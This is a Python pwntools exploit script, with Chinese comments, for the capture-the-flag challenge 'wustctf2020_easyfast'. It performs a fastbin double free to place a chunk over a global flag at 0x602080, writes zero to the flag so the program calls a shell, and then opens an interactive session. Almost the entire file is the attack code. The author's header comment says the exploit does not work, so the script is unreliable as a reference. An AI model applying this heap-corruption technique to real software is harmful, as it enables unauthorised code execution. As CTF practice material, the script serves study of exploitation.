'''
@Author       : 白银
@Date         : 2023-03-16 10:34:10
@LastEditors  : 白银
@LastEditTime : 2023-03-16 16:53:29
@FilePath     : /pwn/wustctf2020_easyfast.py
@Description  : fastbin double_free  https://buuoj.cn/challenges#wustctf2020_easyfast  https://www.bilibili.com/video/BV1Uv411j7fr?t=2461.7&p=22
@Attention    : 打不通
@Copyright (c) 2023 by 白银 captain-jparrow@qq.com, All Rights Reserved. 
'''

from pwn import *

set_arch = 0  # set_arch中，int，0→amd64，1→arm64，2→i386
pwnfile = './wustctf2020_easyfast'  # pwnfile， str，二进制文件
if_remote = 1  # if_remote，int，1→远程，别的数字→本地
# 打本地，if_remote改别的数字就可以，最后两个参数随便改


# set_arch = 0
if set_arch == 0:
    context(log_level='debug', arch='amd64', os='linux')
elif set_arch == 1:
    context(log_level='debug', arch='arm64', os='linux')
elif set_arch == 2:
    context(log_level='debug', arch='i386', os='linux')
# pwnfile = './pwn1'
elf = ELF(pwnfile)
# if_remote = 0  # 0为远程
if if_remote == 1:
    io = remote("192.168.61.139", 8888)
    # io = remote(remote_addr, remote_port)
    # io = remote("node4.buuoj.cn", 26852)
    # libc = ELF('/home/jack/Desktop/libc.so.6')
    if set_arch == 0 or set_arch == 1:
        libc = ELF('/home/jack/Desktop/2.23x64libc.so.6')
    else:
        libc = ELF('/home/jack/Desktop/2.23x86libc.so.6')
else:
    io = process(pwnfile)
    # 本地用
    # elf = ELF(pwnfile)
    libc = elf.libc
    rop = ROP(pwnfile)
    # 本地调试用
    gdb.attach(io)
    pause()

def malloc(io, size):
    io.recvuntil("choice>\n")
    io.sendline("1")
    io.recvuntil("size>\n")
    io.sendline(str(size))

def free(io, idx):
    io.recvuntil("choice>\n")
    io.sendline("2")
    io.recvuntil("index>\n")
    io.sendline(str(idx))

def write(io, idx, content):
    io.recvuntil("choice>\n")
    io.sendline("3")
    io.recvuntil("index>\n")
    io.sendline(str(idx))
    io.sendline(str(content))

def if_use_sh(io):
    io.recvuntil("choice>\n")
    io.sendline("4")

target_addr = 0x602080 # 通过if ( qword_602090 )判断是否调用sh，找到qword_602090的地址，但是fd指向的是chunk的头部，80位置可以作为chunk的prev_size当头部
malloc(io, 0x40) # 0
malloc(io, 0x40) # 1
free(io, 0)
free(io, 1)
free(io, 0) 
malloc(io, 0x40) # 2 此时地址为chunk0，此处的三个malloc是上面三个free逆操作
write(io, 2, p64(target_addr)) # 将target_addr写入chunk0的fd中
malloc(io, 0x40) # 3 此时地址为chunk1
malloc(io, 0x40) # 4 此时地址为chunk0
malloc(io, 0x40) # 5 将空间申请到target_addr的位置
write(io, 5, p64(0)) # 为了通过if ( qword_602090 )验证，写0调用sh
if_use_sh(io)
# delimiter = '>'
# if if_remote == 1:
#     io.sendline(payload)  # 远程用
# else:
#     # io.sendlineafter(delimiter, payload)  # 本地用
#     io.sendline(payload)
io.interactive()